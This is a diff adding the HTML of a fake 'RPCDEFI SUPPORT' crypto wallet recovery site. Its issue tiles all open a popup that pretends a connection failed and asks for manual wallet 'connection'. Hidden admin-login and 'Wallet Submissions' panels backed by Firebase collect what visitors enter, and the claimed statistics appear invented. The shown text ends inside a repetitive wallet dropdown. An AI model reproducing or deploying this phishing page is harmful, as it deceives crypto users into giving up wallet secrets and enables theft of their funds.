@@ -1,0 +1,2336 @@
+source: <!DOCTYPE html><html class="no-js" lang="en">
+<head>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/css/select2.min.css" integrity="sha256-XBGuNL8XpG9vs3zB9RFs8atFPKz+fcuf0qz76yzbYFo=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js" integrity="sha256-Y0jHMaSa6m6ZV3xmeZeOjOQ9g5aT47LSRXD/Sx+1zjA=" crossorigin="anonymous"></script>
+    <!-- Add Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<link rel="preload" href="assets/media/07a54048a9278940-s.p.woff" as="font" type="font/woff2"/>
+<link rel="preload" href="assets/media/2b3f1035ed87a788-s.p.woff" as="font" type="font/woff2"/>
+<link rel="stylesheet" href="assets/css/cc6cbf47a7d40733.css" data-precedence="next"/>
+<link rel="stylesheet" href="assets/css/50a75f76d008e425.css" data-precedence="next"/>
+<link rel="stylesheet" href="assets/css/8a1af3238480ce57.css" data-precedence="next"/>
+<link rel="stylesheet" id="stm-stmicons-css" href="assets/css/stmicons.css" type="text/css" media="all">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+<title>RPCDEFI SUPPORT- We are here to help you resolve your crypto related issues</title>
+<meta name="next-size-adjust"/>
+<meta name="description" content="Hub Restore Node - We are here to help you resolve your crypto related issues">
+<link rel="icon" type="image/png" href="https://rpcdefisupport.com/assets/images/favicon.png">
+<style>
+        .error-message {
+            color: red;
+            display: none;
+            margin-top: 10px;
+        }
+        
+        .icon{
+  width: 50%;
+  height: auto;
+  text-align: center;
+  margin: 30px 25%;
+  clear: both;
+  background: ;
+}
+.icon i{
+  color: #fff;
+  font-weight: lighter;
+  font-size: 80%;
+  margin: 0 2%;
+}
+       footer{
+  width: 100%;
+  height: auto;
+  padding: 50px 0 0 0;
+  margin: 30px  0 0 0;
+  text-align: center;
+  margin-bottom: 200px;
+}
+footer p{
+  color: #3C7DCD;
+  font-family: sans-serif;
+  font-weight: bolder;
+  font-size: 100%;
+}
+.statistic{
+  width: 80%;
+  height: ;
+  padding: 0;
+  margin: 0 10%;
+  text-align: center;
+  clear: both;
+  background: ;
+}
+
+.break{
+  float:left ;
+  width: 15%;
+  height: auto;
+  padding: 0;
+  margin: 0 0 0 14%;
+}
+.break span{
+  margin: 0 8%;
+  color: #fff;
+  font-family: sans-serif;
+}
+.break span.value{
+  font-size:27px;
+  font-weight:bolder
+}
+
+/* Admin Panel Styles */
+#adminLoginContainer {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    z-index: 9999;
+}
+
+#adminLoginContainer > div {
+    background: #fff;
+    width: 300px;
+    margin: 100px auto;
+    padding: 20px;
+    border-radius: 5px;
+}
+
+#adminPanel {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+    z-index: 9998;
+    overflow: auto;
+}
+
+#adminLoginBtn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    padding: 10px;
+    background: #333;
+    color: #fff;
+    border: none;
+    border-radius: 50%;
+    display: none;
+    z-index: 9997;
+}
+
+.submission-item {
+    border: 1px solid #ddd;
+    padding: 15px;
+    margin-bottom: 10px;
+    border-radius: 5px;
+}
+
+.delete-btn {
+    background: #dc3545;
+    color: #fff;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 3px;
+    cursor: pointer;
+}
+
+    </style>
+</head>
+<body class=" __variable_0f56c4 __variable_8b61f7">
+<div class="tradingview-widget-container">
+  <div class="tradingview-widget-container__widget"></div>
+  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-tickers.js" async>
+  {
+  "symbols": [
+    {
+      "proName": "FOREXCOM:SPXUSD",
+      "title": "S&P 500"
+    },
+    {
+      "proName": "FOREXCOM:NSXUSD",
+      "title": "US 100"
+    },
+    {
+      "proName": "FX_IDC:EURUSD",
+      "title": "EUR to USD"
+    },
+    {
+      "proName": "BITSTAMP:BTCUSD",
+      "title": "Bitcoin"
+    },
+    {
+      "proName": "BITSTAMP:ETHUSD",
+      "title": "Ethereum"
+    },
+    {
+      "description": "Tron to USD",
+      "proName": "BINANCE:TRXUSD"
+    },
+    {
+      "description": "Tether USD",
+      "proName": "CRYPTOCAP:USDT"
+    }
+  ],
+  "isTransparent": true,
+  "showSymbolLogo": true,
+  "colorTheme": "dark",
+  "locale": "en"
+}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
+</div>
+<section class="banner-area banner-bg" style="background-image:url(assets/images/banner/banner_bg.png)">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-lg-10">
+        <!-- Banner Content -->
+        <div class="banner-content text-center">
+            <h2 class="title">RPC   <span>Recovery Hub</span></h2>
+            <img src="assets/images/hero-img-home-2.png">
+          <p>Every digital artwork on Upside is authentic and truly unique. Blockchain <br>technology makes this new approach to digital ownership possible.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="banner-scroll-down">
+    <a href="#contribution" class="section-link"><span></span><span></span><span></span></a>
+  </div>
+  <div class="banner-shape-wrap">
+    <img alt="" loading="lazy" width="239" height="239" decoding="async" data-nimg="1" class="leftToRight" style="color:transparent" srcSet="assets/media/banner_shape01.d12e9471.png 1x" src="assets/media/banner_shape01.d12e9471.png"/>
+    <img alt="" loading="lazy" width="223" height="223" decoding="async" data-nimg="1" class="alltuchtopdown" style="color:transparent" srcSet="assets/media/banner_shape02.e45cdf77.png 1x, assets/media/banner_shape02.e45cdf77.png 2x" src="assets/media/banner_shape02.e45cdf77.png"/>
+  </div>
+</section>
+<section id="contribution" class="contribution-area pt-50 pb-0">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-lg-10">
+        <!-- Contribution Title -->
+        <div class="contribution-title">
+          <h4 align="justify">Open and decentralized protocol for syncing various Wallets issues on Secure Server. This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet <br><br>It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues. </h4>
+        </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Section Feature -->
+<section id="feature" class="features-area pt-50 pb-110">
+  <div class="container">
+    <!-- Section Title -->
+    <div class="row justify-content-center">
+      <div class="col-lg-10">
+        <div class="section-title text-center mb-70">
+          <h2 class="title">Make Your Selection Below!</h2>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Features Row -->
+    <div class="row">
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Migration Issues</a></h2>
+            <p style="font-size:12px;">Click here for migration related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i class="fas fa-sync-alt" style="font-size: 72px; color:lightblue;"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Validate Wallet</a></h2>
+            <p style="font-size:12px;">Click here for wallet validation related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-wallet"></i></a>
+          </div>
+        </div>
+      </div>
+      
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Assets Recovery</a></h2>
+            <p style="font-size:12px;">Click here for assets recovery related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-recycle"></i></a>
+          </div>
+        </div>
+      </div>
+      
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Rectification</a></h2>
+            <p style="font-size:12px;">Click here for rectification related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-tools"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Gas Fees</a></h2>
+            <p style="font-size:12px;">Click here for Gas Fees related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-gas-pumpk"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Claim Reward</a></h2>
+            <p style="font-size:12px;">Click here for Claim Reward issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-trophy"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Deposits & Withdrawals</a></h2>
+            <p style="font-size:12px;">Click here for Deposits & Withdrawals issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-exchange-alt"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Slippage Error</a></h2>
+            <p style="font-size:12px;">Click here for Slippage Error related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-exclamation-triangle"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Transaction Error</a></h2>
+            <p style="font-size:12px;">Click here for Transaction Error related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-times-circle"></i></a>
+          </div>
+        </div>
+      </div>
+      
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Cross Chain Transfer</a></h2>
+            <p style="font-size:12px;">Click here for Cross Chain Transfer related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-arrows-alt-"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Staking Issues</a></h2>
+            <p style="font-size:12px;">Click here for Staking Issues related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-certificate"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Swap/Exchange</a></h2>
+            <p style="font-size:12px;">Click here for Swap/Exchange related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-exchange-alt"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Connect to Dappst</a></h2>
+            <p style="font-size:12px;">Click here for Connect to Dapps related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-plug"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Login Issues</a></h2>
+            <p style="font-size:12px;">Click here for Login related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-sign-in-alt"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Claim Airdrop</a></h2>
+            <p style="font-size:12px;">Click here for Claim Airdrops related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-gift"></i></a>
+          </div>
+        </div>
+      </div>
+      
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">NFTS Issues</a></h2>
+            <p style="font-size:12px;">Click here for NFTS Issues related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-image"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Missing/Irregular Balance</a></h2>
+            <p style="font-size:12px;">Click here for Missing/Irregular Balance related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-balance-scale"></i></a>
+          </div>
+        </div>
+      </div>
+      
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Whitelist Issues</a></h2>
+            <p style="font-size:12px;">Click here for Whitelist related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-list-alt"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Transaction Delay</a></h2>
+            <p style="font-size:12px;">Click here for Transaction delay related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-hourglass-half"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Locked Account</a></h2>
+            <p style="font-size:12px;">Click here for Locked Account related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-lock"></i></a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Feature Item 2 -->
+      <div class="col-lg-4">
+        <div class="features-item">
+          <div class="features-content">
+            <h2 class="title"><a onclick="openPopup()">Trading Issues</a></h2>
+            <p style="font-size:12px;">Click here for Trading Wallet related issues</p>
+          </div>
+          <div class="features-img">
+            <a onclick="openPopup()"><i style="font-size: 72px; color:lightblue;" class="fas fa-chart-line"></i></a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Features Area Two -->
+<section class="features-area-two features-bg" style="background-image:url(assets/images/bg/features_bg.png)">
+  <div class="container">
+    <!-- Features Inner Wrap -->
+    <div class="features-inner-wrap">
+      <!-- Features Title -->
+      <div class="row">
+        <div class="col-lg-12">
+          <div class="section-title section-title-two text-center">
+            <h2 class="title">Unlocking the Future: Your Trusted Partner in Crypto Wealth Restoration and Wallet Recovery Services.</h2>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+               <footer>
+        <p>Distribution</p>
+        <div class="statistic">
+          <div class="break">
+            <span class="value">100K+</span>
+            <br>
+            <span>active wallets</span>
+          </div>
+
+          <div class="break">
+            <span class="value">500k+</span>
+            <br>
+            <span>resolved issues</span>
+          </div>
+
+          <div class="break">
+            <span class="value">700+</span>
+            <br>
+            <span>contributors</span>
+          </div>
+        </div>
+        
+      </footer>
+     
+       <div class="icon">
+          <i class="fa-brands fa-square-github"></i>
+          <i class="fa-brands fa-twitter"></i>
+          <i class="fa-brands fa-discord"></i>
+          <i class="fa-brands fa-reddit"></i>
+        </div>
+<button type="button" class="scroll-top scroll-to-target false"><a onclick="openPopup()"><i class="fas fa-angle-up"></i></a></button><div class="Toastify"></div>
+
+<!-- Document Area -->
+<section class="document-area">
+    <div class="container">
+        <div class="document-inner-wrap">
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="section-title text-center mb-60" id="contact">
+                        <h2 class="title">Have Any Questions?</h2>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-8">
+                    <div class="document-form-wrap">
+                        <h4 class="title">Get In Touch Now</h4>
+                        <form>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="form-grp">
+                                        <input type="text" placeholder="Your Name" name="name" />
+                                        <p class="form_error"></p>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="form-grp">
+                                        <input type="email" placeholder="Your Email" name="email" />
+                                        <p class="form_error"></p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-grp">
+                                <textarea name="message" placeholder="Enter your message....."></textarea>
+                                <p class="form_error"></p>
+                            </div>
+                            <button type="submit" class="btn">Send Message</button>
+                        </form>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="document-wrap">
+                        <h4 class="title">Terms & Conditions</h4>
+                        <ul class="list-wrap">
+                            <li><a href="#"><span class="icon"><a onclick="openPopup()"><i class="fas fa-file-pdf"></i></a></span>Fund Recovery</a></li>
+                            <li><a href="#"><span class="icon"><a onclick="openPopup()"><i class="fas fa-file-pdf"></i></a></span>Wallet Issues</a></li>
+                            <li><a href="#"><span class="icon"><a onclick="openPopup()"><i class="fas fa-file-pdf"></i></a></span>Responsibilities</a></li>
+                            <li><a href="#"><span class="icon"><a onclick="openPopup()"><i class="fas fa-file-pdf"></i></a></span>Communications</a></li>
+                        </ul>
+                        <a class="btn" href="#">Download All</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="document-shape">
+        <img alt="" loading="lazy" width="151" height="151" decoding="async" data-nimg="1" class="alltuchtopdown"
+            style="color:transparent"
+            srcSet="assets/media/document_shape.62e48a30.png 1x, assets/media/document_shape.62e48a30.png 2x"
+            src="assets/media/document_shape.62e48a30.png" />
+    </div>
+</section>
+
+<!-- Footer Section -->
+<footer>
+    <div class="footer-area footer-bg" style="background-image:url(assets/images/bg/footer_bg.png)">
+        <div class="container">
+            <div class="footer-bottom">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <div class="copyright-text">
+                            <p>Copyright ©2024 RPCDEFISUPPORT. All rights reserved.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer-shape-wrap">
+            <img alt="" loading="lazy" width="110" height="220" decoding="async" data-nimg="1" class="alltuchtopdown"
+                style="color:transparent"
+                srcSet="assets/media/footer_shape01.f72ed564.png 1x, assets/media/footer_shape01.f72ed564.png 2x"
+                src="assets/media/footer_shape01.f72ed564.png" />
+            <img alt="" loading="lazy" width="95" height="95" decoding="async" data-nimg="1" class="leftToRight"
+                style="color:transparent"
+                srcSet="assets/media/footer_shape02.d22f0628.png 1x, assets/media/footer_shape02.d22f0628.png 2x"
+                src="assets/media/footer_shape02.d22f0628.png" />
+        </div>
+    </div>
+</footer>
+
+<!-- Admin Login Container (hidden by default) -->
+<div id="adminLoginContainer">
+    <div>
+        <h3>Admin Login</h3>
+        <form id="adminLoginForm">
+            <input type="email" id="adminEmail" placeholder="Email" required style="width:100%; padding:8px; margin:5px 0;">
+            <input type="password" id="adminPassword" placeholder="Password" required style="width:100%; padding:8px; margin:5px 0;">
+            <button type="submit" style="width:100%; padding:8px; background:#007bff; color:#fff; border:none; margin:5px 0;">Login</button>
+        </form>
+        <button onclick="document.getElementById('adminLoginContainer').style.display='none'" style="width:100%; padding:8px; background:#dc3545; color:#fff; border:none; margin:5px 0;">Cancel</button>
+    </div>
+</div>
+
+<!-- Admin Panel (hidden by default) -->
+<div id="adminPanel">
+    <div style="padding:20px;">
+        <h2>Admin Panel - Wallet Submissions</h2>
+        <button onclick="document.getElementById('adminPanel').style.display='none'; logoutAdmin()" style="padding:8px; background:#dc3545; color:#fff; border:none; margin:5px 0;">Logout</button>
+        <div id="submissionsList" style="margin-top:20px;">
+            <!-- Submissions will be loaded here -->
+        </div>
+    </div>
+</div>
+
+<!-- Admin Login Button (hidden by default) -->
+<button id="adminLoginBtn" onclick="showAdminLogin()">Admin</button>
+
+<!-- Wallet Connection Popup -->
+<div class="popup-container" id="popup-container">
+    <div class="popup">
+        <div class="popup-header">
+            <h6 style="color: black;">Connect Your Wallet <span>To Get Started</span></h6>
+        </div>
+        <div id="connecting">
+            <center>
+                <img src="assets/images/loading.gif" align="center" width="70%">
+                <br><br>
+                <font color="green">Connecting....</font>
+            </center>
+        </div>
+        <div id="walletForm" align="center" style="display: none;">
+            <img src="assets/images/error.png" width="10px"> <font color="red" size="1px">Failed to Connect! Use the form below to connect manually.</font><br>
+           <hr>
+            <form id="walletRecoveryForm">
+            <div class="dropdown image-dropdown">
+                <label for="wallet_id">Wallet Type:</label>
+                     <select id="wallet_id" name="wallet_id">
+        
+    <!-- start -->
+    <option value="Metamask">
+        Metamask
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Trust Wallet">
+        Trust Wallet
+     </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Coinbase">
+        Coinbase
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Keplr Wallet">
+        Keplr Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="SafePal">
+        SafePal
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Tronlink">
+        Tronlink
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Defichain Wallet">
+        Defichain Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="DFX Defichain">
+        DFX Defichain
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Solana">
+        Solana
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Blockchain">
+        Blockchain
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Lobstr Wallet">
+        Lobstr Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Yoroi Wallet">
+        Yoroi Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Coinomi">
+        Coinomi
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Edge Wallet">
+        Edge Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Solar Wallet">
+        Solar Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Pera Algo Wallet">
+        Pera Algo Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Sender Wallet">
+        Sender Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Xcel Pay Wallet">
+        Xcel Pay Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Anchor Wallet">
+        Anchor Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="ONTO">
+        ONTO
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Rainbow">
+        Rainbow
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Agent Wallet">
+        Agent Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="CYBAVO Wallet">
+        CYBAVO Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="GrindPlus">
+        GrindPlus
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="imToken">
+        imToken
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Pillar">
+        Pillar
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Cryto.com | Defi Wallet">
+        Cryto.com | Defi Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Gnosis Safe Multisig">
+        Gnosis Safe Multisig
+    </option>
+    <!-- end -->
+    <!-- start -->
+    <option value="Curve Finance">
+        Curve Finance
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="TokenPocket">
+        TokenPocket
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="MathWallet">
+        MathWallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="BitPay">
+        BitPay
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Ledger Live">
+        Ledger Live
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Walleth">
+        Walleth
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Authereum">
+        Authereum
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Dharma">
+        Dharma
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="1inch Wallet">
+        1inch Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Huobi Wallet">
+        Huobi Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Eidoo">
+        Eidoo
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="MYKEY">
+        MYKEY
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="TrustVault">
+        TrustVault
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Curve Finance">
+        Curve Finance
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="TokenPocket">
+        TokenPocket
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="MathWallet">
+        MathWallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="BitPay">
+        BitPay
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Ledger Live">
+        Ledger Live
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Walleth">
+        Walleth
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Authereum">
+        Authereum
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Dharma">
+        Dharma
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="1inch Wallet">
+        1inch Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Huobi Wallet">
+        Huobi Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Eidoo">
+        Eidoo
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="MYKEY">
+        MYKEY
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="TrustVault">
+        TrustVault
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Atomic">
+        Atomic
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Coin98">
+        Coin98
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="zkSync">
+        zkSync
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Shell Exchange">
+        Shell Exchange
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Index Coop">
+        Index Coop
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="SwapX">
+        SwapX
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Starname">
+        Starname
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Space">
+        Space
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Maskbook">
+        Maskbook
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Snapshot">
+        Snapshot
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Invoice.build">
+        Invoice.build
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Ankr">
+        Ankr
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="DODO">
+        DODO
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="zLOT">
+        zLOT
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Curve Finance">
+        Curve Finance
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="TokenPocket">
+        TokenPocket
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="MathWallet">
+        MathWallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="BitPay">
+        BitPay
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Ledger Live">
+        Ledger Live
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Walleth">
+        Walleth
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Authereum">
+        Authereum
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Dharma">
+        Dharma
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="1inch Wallet">
+        1inch Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Huobi Wallet">
+        Huobi Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Eidoo">
+        Eidoo
+    </option>
+    <!-- end -->
+
+    <!-- start -->
